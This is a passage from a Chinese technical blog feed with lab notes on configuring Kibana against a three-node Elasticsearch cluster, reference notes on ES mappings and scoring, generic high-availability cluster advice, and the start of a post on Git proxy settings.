节点IP&gt;:9200/_security/user/kibana/_password&quot;</span> \<br>  -H <span class="hljs-string">&quot;Content-Type: application/json&quot;</span> \<br>  -d &#x27;&#123;<br>    <span class="hljs-string">&quot;password&quot;</span>: <span class="hljs-string">&quot;&lt;新密码&gt;&quot;</span><br>&#125;&#x27;<br><br>curl -k -u elastic<span class="hljs-function">:wq666666</span> -X POST <span class="hljs-string">&quot;https://192.168.136.8:9200/_security/user/kibana/_password&quot;</span> \<br>  -H <span class="hljs-string">&quot;Content-Type: application/json&quot;</span> \<br>  -d &#x27;&#123;<br>    <span class="hljs-string">&quot;password&quot;</span>: <span class="hljs-string">&quot;wq666666&quot;</span><br>&#125;&#x27;<br></code></pre></td></tr></table></figure><hr><h5 id="1-3-6-修改-Kibana-主配置文件：config-kibana-yml"><a href="#1-3-6-修改-Kibana-主配置文件：config-kibana-yml" class="headerlink" title="1.3.6. 修改 Kibana 主配置文件：config&#x2F;kibana.yml"></a>1.3.6. 修改 Kibana 主配置文件：config&#x2F;kibana.yml</h5><p>Kibana 的连接流程（关键原理）<br>Kibana 启动时，它做的是：</p><ol><li><p><strong>连接你在 <code>elasticsearch.hosts</code> 配置里写的节点</strong>之一；</p></li><li><p>如果连上了，Kibana 会调用该节点的 <a href="https://www.elastic.co/guide/en/elasticsearch/reference/current/cluster.html"><strong>Cluster Info API</strong></a>；</p></li><li><p>从集群返回的响应里，它能看到整个集群的节点列表，包括你后来加的新节点；</p></li><li><p>然后 Kibana 后续的请求，就可以分发到整个集群的任意节点（由 Elasticsearch 自己决定）。</p></li></ol><p>所以 <strong>不是每次新增节点都要改 <code>kibana.yml</code><strong>，</strong>只要原来配置的节点还活着</strong>，看似<code>elasticsearch.hosts: [&quot;https://192.168.136.8:9200&quot;, &quot;https://192.168.136.9:9200&quot;, &quot;https://192.168.136.10:9200&quot;]</code>只配置了三个，只要我们连接上一个，就能获得最新的信息，但是如果三个都连接不上就坏事了</p><figure class="highlight nix"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><code class="hljs nix"><span class="hljs-comment"># 1. 修改配置文件</span><br>vim <span class="hljs-symbol">/mystudy/kibana/kibana/config/kibana.yml</span><br><br><br><span class="hljs-comment"># 2. 添加下述内容</span><br><span class="hljs-comment"># 服务端口</span><br>server.<span class="hljs-params">port:</span> <span class="hljs-number">5601</span><br><br><span class="hljs-comment"># Kibana 服务主机地址</span><br>server.<span class="hljs-params">host:</span> <span class="hljs-string">&quot;192.168.136.8&quot;</span><br><br><span class="hljs-comment"># 国际化 - 中文</span><br>i18n.<span class="hljs-params">locale:</span> <span class="hljs-string">&quot;zh-CN&quot;</span><br><br><span class="hljs-comment"># Elasticsearch 服务主机地址</span><br>elasticsearch.<span class="hljs-params">hosts:</span> [<span class="hljs-string">&quot;https://192.168.136.8:9200&quot;</span>, <span class="hljs-string">&quot;https://192.168.136.9:9200&quot;</span>, <span class="hljs-string">&quot;https://192.168.136.10:9200&quot;</span>]<br><br><br><span class="hljs-comment"># 访问 Elasticsearch 服务的账号密码</span><br>elasticsearch.<span class="hljs-params">username:</span> <span class="hljs-string">&quot;kibana&quot;</span><br>elasticsearch.<span class="hljs-params">password:</span> <span class="hljs-string">&quot;wq666666&quot;</span><br><br><span class="hljs-comment"># Elasticsearch SSL 设置</span><br>elasticsearch.ssl.<span class="hljs-params">verificationMode:</span> none<br>elasticsearch.ssl.<span class="hljs-params">certificateAuthorities:</span><br>  <span class="hljs-operator">-</span> <span class="hljs-string">&quot;/mystudy/es/elasticsearch/config/certs/ca.crt&quot;</span><br><br><span class="hljs-comment"># Kibana 服务 SSL 设置</span><br>server.ssl.<span class="hljs-params">enabled:</span> <span class="hljs-literal">true</span><br>server.ssl.<span class="hljs-params">certificate:</span> <span class="hljs-string">&quot;/mystudy/kibana/kibana/config/kibana1.crt&quot;</span><br>server.ssl.<span class="hljs-params">key:</span> <span class="hljs-string">&quot;/mystudy/kibana/kibana/config/kibana1.key&quot;</span><br></code></pre></td></tr></table></figure><blockquote><p>[!NOTE] 注意事项</p><ol><li><code>kibana</code> 是 Elasticsearch 默认提供的服务账号，专用于 Kibana 与 ES 通信，不应使用具有最高权限的 <code>elastic</code> 超管账号进行配置</li></ol></blockquote><p><img src="/source/_posts/%E7%AC%94%E8%AE%B0%EF%BC%9AElasticSearch%20%E5%9F%BA%E7%A1%80/image-20250501142642453.png"></p><p>监听的地址，监听的网卡，与es 的http.host类似，但是没有_local_ 这种那么灵活的</p><p>Kibana 会按你 <code>elasticsearch.hosts</code> 列表的顺序尝试连接：它会逐一 ping 列表里的地址，直到找到一个能连通的节点才算启动成功。</p><p>如果当前连接的挂掉，他可能需要一段时间反应，来连接下一个，只要还有至少一个 ES 实例可用，Kibana 本身就不会中断服务，也不会让你下线或重新登录，当然，如果kibana 本身依赖的 ES 不可用，那 Kibana 也不能用了</p><p>例如你Kibana 部署在136.8，虽然你136.8还启动，但是 ES 集群不可用，那你访问 <code>https://192.168.136.8:5601/spaces/enter</code> 很大可能进不去，然后我们可能需要启动多台es 服务器，才能重新进去kibana</p><hr><h5 id="1-3-7-创建-kibana-用户"><a href="#1-3-7-创建-kibana-用户" class="headerlink" title="1.3.7. 创建 kibana 用户"></a>1.3.7. 创建 kibana 用户</h5><p>该账户不同于前面提到的服务账户。服务账户专用于 Kibana 与 Elasticsearch 之间的通信，登录 Kibana 时使用的也是这个账户。</p><p>这里的账户是由于 Kibana 也不允许以 root 用户身份运行，因此我们需要创建一个名为 <code>kibana</code> 的用户，并使用该用户进行后续的操作和配置。</p><p>但是由于我们的 Elasticsearch 和 Kibana 部署在同一台主机上，因此我们可以直接复用 <code>es</code> 用户来启动 Kibana，而不需要单独创建 <code>kibana</code> 用户啦</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># 1. 切换 root 用户</span><br>su root<br><br><br><span class="hljs-comment"># 2. 修改 Kibana 文件拥有者为 es</span><br><span class="hljs-built_in">chown</span> -R es:es /mystudy/kibana/kibana<br><br><br><span class="hljs-comment"># 3. 切换回 es 用户</span><br>su es<br></code></pre></td></tr></table></figure><hr><h5 id="1-3-8-启动-Kibana"><a href="#1-3-8-启动-Kibana" class="headerlink" title="1.3.8. 启动 Kibana"></a>1.3.8. 启动 Kibana</h5><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># 1. 切换 es 用户</span><br>su es<br><br><br><span class="hljs-comment"># 2. 进入 Kibana 目录</span><br><span class="hljs-built_in">cd</span> /mystudy/kibana/kibana<br><br><br><span class="hljs-comment"># 3. 启动 Kibana</span><br><span class="hljs-comment"># 3.1. 前台启动</span><br>bin/kibana<br><br><span class="hljs-comment"># 3.2. 后台启动</span><br><span class="hljs-built_in">nohup</span> /mystudy/kibana/kibana/bin/kibana &gt;kibana.log 2&gt;&amp;1 &amp;<br><br><br><span class="hljs-comment"># 4. 补充：停止后台 Kibana</span><br>ps aux | grep kibana<br><br><span class="hljs-built_in">kill</span> -9 123456<br></code></pre></td></tr></table></figure><blockquote><p>[!NOTE] 注意事项</p><ol><li><code>Kibana</code> 并不支持使用 <code>kibana -d</code> 进行后台启动</li></ol></blockquote><hr><h5 id="1-3-9-访问-Kibana-节点"><a href="#1-3-9-访问-Kibana-节点" class="headerlink" title="1.3.9. 访问 Kibana 节点"></a>1.3.9. 访问 Kibana 节点</h5><p>访问 Kibana 节点： <a href="https://192.168.136.8:5601/">https://192.168.136.8:5601</a><br><img src="/source/_posts/%E7%AC%94%E8%AE%B0%EF%BC%9AElasticSearch%20%E5%9F%BA%E7%A1%80/image-20250417121921514.png"></p><hr><h1 id="四、补充"><a href="#四、补充" class="headerlink" title="四、补充"></a>四、补充</h1><h3 id="1-相关网站"><a href="#1-相关网站" class="headerlink" title="1. 相关网站"></a>1. 相关网站</h3><ol><li>&#x3D;&#x3D;ElasticSearch 官方地址&#x3D;&#x3D;：<ol><li><a href="https://www.elastic.co/cn/">https://www.elastic.co/cn/</a></li></ol></li><li>&#x3D;&#x3D;ElasticSearch 文档&#x3D;&#x3D;：<ol><li><a href="https://www.elastic.co/guide/en/elasticsearch/reference/8.18/mapping-params.html">https://www.elastic.co/guide/en/elasticsearch/reference/8.18/mapping-params.html</a></li></ol></li><li>&#x3D;&#x3D;ElasticSearch 下载地址&#x3D;&#x3D;：<ol start="2"><li><a href="https://www.elastic.co/cn/downloads/past-releases#elasticsearch">https://www.elastic.co/cn/downloads/past-releases#elasticsearch</a></li></ol></li><li>&#x3D;&#x3D;Kibana 下载地址&#x3D;&#x3D;：<ol><li><a href="https://www.elastic.co/cn/downloads/past-releases#kibana">https://www.elastic.co/cn/downloads/past-releases#kibana</a></li></ol></li><li>&#x3D;&#x3D;IK 分词器下载地址&#x3D;&#x3D;：<ol><li><a href="https://release.infinilabs.com/analysis-ik/stable/">https://release.infinilabs.com/analysis-ik/stable/</a></li></ol></li><li>&#x3D;&#x3D;拼音分词器下载地址&#x3D;&#x3D;：<ol><li><a href="https://release.infinilabs.com/analysis-pinyin/stable/">https://release.infinilabs.com/analysis-pinyin/stable/</a></li></ol></li><li>&#x3D;&#x3D;拼音分词器文档&#x3D;&#x3D;：<ol><li><a href="https://github.com/infinilabs/analysis-pinyin">https://github.com/infinilabs/analysis-pinyin</a></li></ol></li><li>手都有<ol><li><a href="https://release.infinilabs.com/">https://release.infinilabs.com/</a></li></ol></li></ol><hr><h3 id="2-ES-目录结构"><a href="#2-ES-目录结构" class="headerlink" title="2. ES 目录结构"></a>2. ES 目录结构</h3><figure class="highlight nix"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs nix">elasticsearch <span class="hljs-symbol">/</span><br>|<br>|-- bin <span class="hljs-symbol">/</span>                                             <span class="hljs-comment"># ES 的可执行脚本</span><br>|<br>|-- config <span class="hljs-symbol">/</span>                                          <span class="hljs-comment"># ES 的配置目录</span><br>|<br>|-- jdk <span class="hljs-symbol">/</span>                                             <span class="hljs-comment"># 内置 JDK </span><br>|<br>|-- lib <span class="hljs-symbol">/</span>                                             <span class="hljs-comment"># ES 依赖的类库</span><br>|<br>|-- logs <span class="hljs-symbol">/</span>                                            <span class="hljs-comment"># 日志目录</span><br>|<br>|-- modules <span class="hljs-symbol">/</span>                                         <span class="hljs-comment"># 模块目录</span><br>|<br>|-- plugins <span class="hljs-symbol">/</span>                                         <span class="hljs-comment"># 插件目录</span><br></code></pre></td></tr></table></figure><hr><h3 id="3-正排索引"><a href="#3-正排索引" class="headerlink" title="3. 正排索引"></a>3. 正排索引</h3><hr><table><thead><tr><th>词条</th><th>ID</th></tr></thead><tbody><tr><td>Elasticsearch</td><td>…….</td></tr><tr><td>是</td><td>…….</td></tr><tr><td>一个</td><td>…….</td></tr><tr><td>开源</td><td>…….</td></tr><tr><td>搜索引擎</td><td>…….</td></tr><tr><td>适合</td><td>…….</td></tr><tr><td>处理</td><td>…….</td></tr><tr><td>大规模</td><td>…….</td></tr><tr><td>结构化</td><td>…….</td></tr><tr><td>非结构化</td><td>…….</td></tr><tr><td>数据</td><td>…….</td></tr></tbody></table><h3 id="4-倒排索引"><a href="#4-倒排索引" class="headerlink" title="4. 倒排索引"></a>4. 倒排索引</h3><hr><h3 id="5-ES-Mapping-属性"><a href="#5-ES-Mapping-属性" class="headerlink" title="5. ES Mapping 属性"></a>5. ES Mapping 属性</h3><p>Mapping 是对索引库中文档的约束，相当于 MySQL 中列名的属性，常见的 Mapping 属性包括：</p><ol><li>&#x3D;&#x3D;type&#x3D;&#x3D;：<ol><li>字段数据类型</li></ol></li><li>&#x3D;&#x3D;index&#x3D;&#x3D;：<ol><li>是否创建索引（是否参与搜索），默认为 true</li><li>可以简单理解为：“是否需要被搜索 -&gt; 决定是否需要倒排索引”</li></ol></li><li>&#x3D;&#x3D;analyzer&#x3D;&#x3D;：<ol><li>使用的分词器</li></ol></li><li>&#x3D;&#x3D;properties&#x3D;&#x3D;：<ol><li>该字段的子字段</li></ol></li></ol><p>注意：这里只是列举了常见的 Mapping 属性，其他的可以查询 <a href="https://www.elastic.co/guide/en/elasticsearch/reference/8.18/mapping-params.html">ES 文档</a></p><hr><h3 id="6-ES-字段数据类型"><a href="#6-ES-字段数据类型" class="headerlink" title="6. ES 字段数据类型"></a>6. ES 字段数据类型</h3><ol><li>&#x3D;&#x3D;字符串&#x3D;&#x3D;：<ol><li><font color="#00b0f0">可分词文本</font>：<ol><li>text</li></ol></li><li><font color="#00b0f0">精确值</font>：<ol><li>keyword</li></ol></li></ol></li><li>&#x3D;&#x3D;数值&#x3D;&#x3D;：<ol><li><font color="#00b0f0">整数类型</font>：<ol><li><font color="#7030a0">byte</font>：<ul><li>1 字节，-128 到 127</li></ul></li><li><font color="#7030a0">short</font>：<ul><li>2 字节，-32768 到 32767</li></ul></li><li><font color="#7030a0">integer</font>：<ul><li>4 字节，-2³¹ 到 2³¹-1</li></ul></li><li><font color="#7030a0">long</font>：<ul><li>8 字节，-2⁶³ 到 2⁶³-1</li></ul></li></ol></li><li><font color="#00b0f0">浮点数类型</font>：<ol><li><font color="#7030a0">half_float</font>：<ul><li>2字节，3~5 位十进制精度</li></ul></li><li><font color="#7030a0">float</font>：<ul><li>4字节，7 位十进制精度</li></ul></li><li><font color="#7030a0">double</font>：<ul><li>8字节，15~16 位十进制精度</li></ul></li></ol></li></ol></li><li>&#x3D;&#x3D;布尔&#x3D;&#x3D;：<ol><li>boolean</li></ol></li><li>&#x3D;&#x3D;日期&#x3D;&#x3D;：<ol><li>date</li></ol></li><li>&#x3D;&#x3D;对象&#x3D;&#x3D;：<ol><li>object</li></ol></li></ol><hr><hr><h3 id="7-ES-打分算法"><a href="#7-ES-打分算法" class="headerlink" title="7. ES 打分算法"></a>7. ES 打分算法</h3><p>ES 5.0 之前选用 TF-IDF 打分算法，但是该算法有个缺点，打分会随着词频的增加而越来越大，在 ES 5.0 之后选用 BM 2.5 算法，虽然也会随着词频增加而增大，但增长曲线会逐渐趋于水平</p><p><img src="/source/_posts/%E7%AC%94%E8%AE%B0%EF%BC%9AElasticSearch%20%E5%9F%BA%E7%A1%80/PixPin_2025-04-27_11-26-54_PhotoGrid.png"></p><p><img src="/source/_posts/%E7%AC%94%E8%AE%B0%EF%BC%9AElasticSearch%20%E5%9F%BA%E7%A1%80/PixPin_2025-04-27_11-22-54_PhotoGrid.png"></p><blockquote><p>[!NOTE] 注意事项</p><ol><li>在以后设计的时候也需要注意，参与算分的条件越多，性能就越差</li></ol></blockquote><hr><h3 id="8-常见距离单位"><a href="#8-常见距离单位" class="headerlink" title="8. 常见距离单位"></a>8. 常见距离单位</h3><ol><li>&#x3D;&#x3D;米&#x3D;&#x3D;：<ol><li><code>m</code></li></ol></li><li>&#x3D;&#x3D;千米&#x3D;&#x3D;：<ol><li><code>km</code></li></ol></li><li>&#x3D;&#x3D;英里&#x3D;&#x3D;：<ol><li><code>mi</code></li></ol></li><li>&#x3D;&#x3D;码&#x3D;&#x3D;：<ol><li><code>yd</code></li></ol></li></ol><hr><h1 id="麻烦"><a href="#麻烦" class="headerlink" title="麻烦"></a>麻烦</h1><p><img src="/source/_posts/%E7%AC%94%E8%AE%B0%EF%BC%9AElasticSearch%20%E5%9F%BA%E7%A1%80/image-20250418184544203.png" alt="|500"></p><p><img src="/source/_posts/%E7%AC%94%E8%AE%B0%EF%BC%9AElasticSearch%20%E5%9F%BA%E7%A1%80/image-20250417122657685.png"><br><img src="/source/_posts/%E7%AC%94%E8%AE%B0%EF%BC%9AElasticSearch%20%E5%9F%BA%E7%A1%80/image-20250417122752564.png"></p><p><img src="/source/_posts/%E7%AC%94%E8%AE%B0%EF%BC%9AElasticSearch%20%E5%9F%BA%E7%A1%80/image-20250417122922783.png"></p><hr><h1 id="补充，企业级高可用"><a href="#补充，企业级高可用" class="headerlink" title="补充，企业级高可用"></a>补充，企业级高可用</h1><p>构建企业级高可用（High Availability, HA）集群时，需要从多个方面进行综合考虑，以确保系统在各种故障场景下仍能提供稳定、可靠的服务。以下是高可用集群设计和部署时需要关注的核心方面：</p><hr><h3 id="1-1-架构设计"><a href="#1-1-架构设计" class="headerlink" title="1. 1. 架构设计"></a>1. <strong>1. 架构设计</strong></h3><ul><li><strong>冗余性</strong>：<ul><li>确保系统中没有单点故障（Single Point of Failure, SPOF）。例如，RabbitMQ 集群需要多节点，负载均衡器（如 HAProxy）需要通过 Keepalived 实现主备切换。</li><li>使用多副本机制（如 RabbitMQ 的队列镜像）保证数据冗余。</li></ul></li><li><strong>分布式部署</strong>：<ul><li>考虑跨机房或跨数据中心部署，以应对区域性故障。</li><li>使用 Federation 或 Shovel 插件实现 RabbitMQ 跨地域的数据同步。</li></ul></li><li><strong>负载均衡</strong>：<ul><li>配置负载均衡器（如 HAProxy、Nginx、F5）将请求分发到多个后端节点。</li><li>选择合适的负载均衡算法（如轮询、最少连接）以优化性能。</li></ul></li><li><strong>可扩展性</strong>：<ul><li>设计时考虑集群的水平扩展能力，确保新增节点不会影响现有服务。</li><li>评估系统在高负载下的性能瓶颈，如网络带宽、磁盘 I&#x2F;O 等。</li></ul></li></ul><hr><h3 id="2-2-故障转移与恢复"><a href="#2-2-故障转移与恢复" class="headerlink" title="2. 2. 故障转移与恢复"></a>2. <strong>2. 故障转移与恢复</strong></h3><ul><li><strong>自动故障转移</strong>：<ul><li>使用 Keepalived 或类似工具实现虚拟 IP（VIP）漂移，确保前端服务的高可用。</li><li>配置 RabbitMQ 集群的队列镜像，确保节点故障时数据不丢失。</li></ul></li><li><strong>健康检查</strong>：<ul><li>配置负载均衡器的健康检查机制（如 HAProxy 的 <code>check</code> 选项），及时剔除故障节点。</li><li>监控 RabbitMQ 节点的运行状态（如通过 <code>rabbitmqctl cluster_status</code> 或管理插件）。</li></ul></li><li><strong>快速恢复</strong>：<ul><li>制定故障恢复流程（如节点重启、数据同步）。</li><li>测试恢复时间目标（RTO, Recovery Time Objective），确保满足业务需求。</li></ul></li><li><strong>备份与灾难恢复</strong>：<ul><li>定期备份关键数据和配置（如 RabbitMQ 的元数据、队列定义）。</li><li>制定灾难恢复计划（DR, Disaster Recovery），并定期演练。</li></ul></li></ul><hr><h3 id="3-3-性能优化"><a href="#3-3-性能优化" class="headerlink" title="3. 3. 性能优化"></a>3. <strong>3. 性能优化</strong></h3><ul><li><strong>资源分配</strong>：<ul><li>确保服务器硬件（CPU、内存、磁盘）满足集群需求，特别是在高并发场景下。</li><li>优化 RabbitMQ 的内存和磁盘使用（如调整 <code>vm_memory_high_watermark</code> 参数）。</li></ul></li><li><strong>网络优化</strong>：<ul><li>使用高带宽、低延迟的网络，减少节点间通信开销。</li><li>配置合适的 TCP 参数（如增大连接数、优化超时时间）。</li></ul></li><li><strong>队列管理</strong>：<ul><li>合理设置队列的持久化策略和镜像策略，避免过多副本导致性能下降。</li><li>使用 Lazy Queues 减少内存占用，适合大数据量场景。</li></ul></li><li><strong>负载均衡优化</strong>：<ul><li>根据业务特点选择合适的负载均衡策略（如基于会话的粘性连接或动态权重）。</li><li>调整 HAProxy 的 <code>maxconn</code> 和超时参数，适应高并发场景。</li></ul></li></ul><hr><h3 id="4-4-监控与告警"><a href="#4-4-监控与告警" class="headerlink" title="4. 4. 监控与告警"></a>4. <strong>4. 监控与告警</strong></h3><ul><li><strong>实时监控</strong>：<ul><li>部署监控系统（如 Prometheus + Grafana、Zabbix）跟踪集群的运行状态。</li><li>监控关键指标：<ul><li>RabbitMQ：队列长度、消息速率、连接数、内存&#x2F;磁盘使用率。</li><li>HAProxy：请求速率、后端节点健康状态、响应时间。</li><li>Keepalived：VIP 状态、主备切换事件。</li><li>服务器：CPU、内存、磁盘 I&#x2F;O、网络流量。</li></ul></li></ul></li><li><strong>告警机制</strong>：<ul><li>配置告警规则（如队列积压、节点故障、VIP 漂移），通过邮件、短信或企业微信通知运维团队。</li><li>设置多级告警阈值（如警告、严重），避免误报或漏报。</li></ul></li><li><strong>日志管理</strong>：<ul><li>收集和分析系统日志（RabbitMQ、HAProxy、Keepalived），使用集中式日志系统（如 ELK Stack、Loki）。</li><li>定期审查日志，排查潜在问题。</li></ul></li></ul><hr><h3 id="5-5-安全性"><a href="#5-5-安全性" class="headerlink" title="5. 5. 安全性"></a>5. <strong>5. 安全性</strong></h3><ul><li><strong>网络安全</strong>：<ul><li>配置防火墙，仅开放必要端口（如 RabbitMQ 的 5672、15672，HAProxy 的 80&#x2F;443）。</li><li>使用 VPC 或专用网络隔离集群，防止未经授权的访问。</li></ul></li><li><strong>数据加密</strong>：<ul><li>为 RabbitMQ 和 HAProxy 配置 TLS&#x2F;SSL，加密客户端与服务器的通信。</li><li>确保节点间通信（如 Erlang 通信）也启用加密。</li></ul></li><li><strong>访问控制</strong>：<ul><li>配置 RabbitMQ 的用户权限，限制客户端的操作范围（如只允许特定用户访问特定队列）。</li><li>使用强密码或集成 LDAP&#x2F;SSO 进行认证。</li></ul></li><li><strong>漏洞管理</strong>：<ul><li>定期更新 RabbitMQ、HAProxy、Keepalived 和操作系统，修复已知漏洞。</li><li>订阅安全公告，及时响应新的威胁。</li></ul></li></ul><hr><h3 id="6-6-数据一致性与可靠性"><a href="#6-6-数据一致性与可靠性" class="headerlink" title="6. 6. 数据一致性与可靠性"></a>6. <strong>6. 数据一致性与可靠性</strong></h3><ul><li><strong>数据冗余</strong>：<ul><li>配置 RabbitMQ 的队列镜像（Mirrored Queues），确保数据在多个节点上有副本。</li><li>评估镜像策略（如 <code>ha-mode: all</code> 或 <code>ha-mode: exactly</code>），平衡可靠性和性能。</li></ul></li><li><strong>消息持久化</strong>：<ul><li>启用队列和消息的持久化（<code>durable: true</code>, <code>delivery_mode: 2</code>），确保消息在故障后不丢失。</li><li>注意持久化对性能的影响，必要时优化磁盘 I&#x2F;O。</li></ul></li><li><strong>事务与确认机制</strong>：<ul><li>使用 Publisher Confirms 或 Consumer Acknowledgements 确保消息可靠投递。</li><li>根据业务需求权衡性能和可靠性（如批量确认 vs 逐条确认）。</li></ul></li></ul><hr><h3 id="7-7-运维管理"><a href="#7-7-运维管理" class="headerlink" title="7. 7. 运维管理"></a>7. <strong>7. 运维管理</strong></h3><ul><li><strong>自动化运维</strong>：<ul><li>使用 Ansible、Terraform 或 Kubernetes 自动化集群的部署和配置。</li><li>配置 CI&#x2F;CD 流程，简化版本升级和补丁应用。</li></ul></li><li><strong>容量规划</strong>：<ul><li>定期评估集群的负载和增长趋势，提前规划扩容。</li><li>测试集群在峰值负载下的表现，确保满足 SLA（Service Level Agreement）。</li></ul></li><li><strong>文档与培训</strong>：<ul><li>维护详细的架构文档、运维手册和故障处理流程。</li><li>定期培训运维团队，确保熟悉集群的维护和应急响应。</li></ul></li></ul><hr><h3 id="8-8-测试与验证"><a href="#8-8-测试与验证" class="headerlink" title="8. 8. 测试与验证"></a>8. <strong>8. 测试与验证</strong></h3><ul><li><strong>高可用性测试</strong>：<ul><li>模拟各种故障场景（如节点宕机、网络分区、VIP 切换），验证故障转移是否正常。</li><li>测试数据一致性，确保故障后无消息丢失或重复。</li></ul></li><li><strong>性能测试</strong>：<ul><li>使用工具（如 JMeter、PerfKit）模拟高并发场景，评估集群的吞吐量和响应时间。</li><li>识别瓶颈（如网络、磁盘、队列配置）并优化。</li></ul></li><li><strong>灾难恢复演练</strong>：<ul><li>定期进行灾难恢复演练，验证备份和恢复流程的有效性。</li><li>记录演练结果，优化恢复时间和流程。</li></ul></li></ul><hr><h3 id="9-9-成本与资源管理"><a href="#9-9-成本与资源管理" class="headerlink" title="9. 9. 成本与资源管理"></a>9. <strong>9. 成本与资源管理</strong></h3><ul><li><strong>资源成本</strong>：<ul><li>评估硬件、云服务和 лицен费用，优化资源分配（如选择合适的实例类型）。</li><li>使用自动化伸缩（如果在云端部署）降低闲置资源成本。</li></ul></li><li><strong>运维成本</strong>：<ul><li>通过自动化和监控减少人工干预，降低运维成本。</li><li>选择开源工具（如 HAProxy、Keepalived）或性价比高的商业解决方案。</li></ul></li></ul><hr><h3 id="10-10-业务需求与-SLA"><a href="#10-10-业务需求与-SLA" class="headerlink" title="10. 10. 业务需求与 SLA"></a>10. <strong>10. 业务需求与 SLA</strong></h3><ul><li><strong>可用性目标</strong>：<ul><li>根据业务需求定义可用性目标（如 99.9% 或 99.99% 的 uptime）。</li><li>计算允许的宕机时间，确保架构设计满足要求。</li></ul></li><li><strong>延迟与吞吐量</strong>：<ul><li>明确业务对消息延迟和吞吐量的要求，优化配置以满足这些指标。</li></ul></li><li><strong>数据保留策略</strong>：<ul><li>根据业务需求设置消息的保留时间和队列的清理策略（如 TTL、最大长度）。</li></ul></li><li><strong>合规性</strong>：<ul><li>确保集群满足行业法规（如 GDPR、HIPAA），特别是在数据隐私和审计方面。</li></ul></li></ul><hr><h3 id="11-总结"><a href="#11-总结" class="headerlink" title="11. 总结"></a>11. <strong>总结</strong></h3><p>高可用集群的设计和维护需要从架构、故障转移、性能、监控、安全、数据可靠性、运维、测试、成本和业务需求等多个维度综合考虑。对于 RabbitMQ 集群搭配 HAProxy + Keepalived 的场景，核心是确保无单点故障、数据冗余和快速恢复，同时通过监控和自动化运维降低风险。建议根据具体业务场景（如消息量、延迟要求、预算）进一步细化配置，并定期进行测试和优化。</p><p>如果你有某个方面需要深入探讨（例如具体配置、工具选型或测试方法），请告诉我！</p><p><img src="/source/_posts/%E7%AC%94%E8%AE%B0%EF%BC%9AElasticSearch%20%E5%9F%BA%E7%A1%80/image-20250416192542363.png"></p><p><img src="/source/_posts/%E7%AC%94%E8%AE%B0%EF%BC%9AElasticSearch%20%E5%9F%BA%E7%A1%80/image-20250416192834497.png"></p><p>有 ES 脑裂问题<br><img src="/source/_posts/%E7%AC%94%E8%AE%B0%EF%BC%9AElasticSearch%20%E5%9F%BA%E7%A1%80/image-20250416194752833.png"></p><p>偶数的话，可能出现问题和脑裂</p><hr>]]></content>
    
    
    <categories>
      
      <category>数据管理</category>
      
      <category>ELK 三件套</category>
      
      <category>ElasticSearch</category>
      
      <category>Elasticsearch 基础</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>笔记：Git 家族</title>
    <link href="/2025/04/13/%E7%AC%94%E8%AE%B0%EF%BC%9AGit%20%E5%AE%B6%E6%97%8F/"/>
    <url>/2025/04/13/%E7%AC%94%E8%AE%B0%EF%BC%9AGit%20%E5%AE%B6%E6%97%8F/</url>
    
    <content type="html"><![CDATA[<p>.&#x2F;ignore</p><p>进行 Git 代理配置</p><ol><li><p>&#x3D;&#x3D;检查是否配置过 Git 代理&#x3D;&#x3D;</p><figure class="highlight lua"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs lua">git <span class="hljs-built_in">config</span> <span class="hljs-comment">--global http.proxy</span><br>git <span class="hljs-built_in">config</span> <span class="hljs-comment">--global https.proxy</span><br></code></pre></td></tr></table></figure></li><li><p>&#x3D;&#x3D;如果存在代理，进行代理取消&#x3D;&#x3D;</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs stylus">git config <span class="hljs-attr">--global</span> <span class="hljs-attr">--unset</span> http<span class="hljs-selector-class">.proxy</span><br>git config <span class="hljs-attr">--global</span> <span class="hljs-attr">--unset</span> https.proxy<br></code></pre></td></tr></table></figure></li><li><p>&#x3D;&#x3D;重新配置 Git 代理&#x3D;&#x3D;</p><figure class="highlight lua"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs lua">git <span class="hljs-built_in">config</span> <span class="hljs-comment">--global https.proxy 127.0.0.1:7890</span><br>git <span class="hljs-built_in">config</span> <span class="hljs-comment">--global http.proxy 127.0.0.1:7890</span><br></code></pre></td></tr></table></figure></li></ol><p>第一次</p><figure class="highlight dockerfile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span 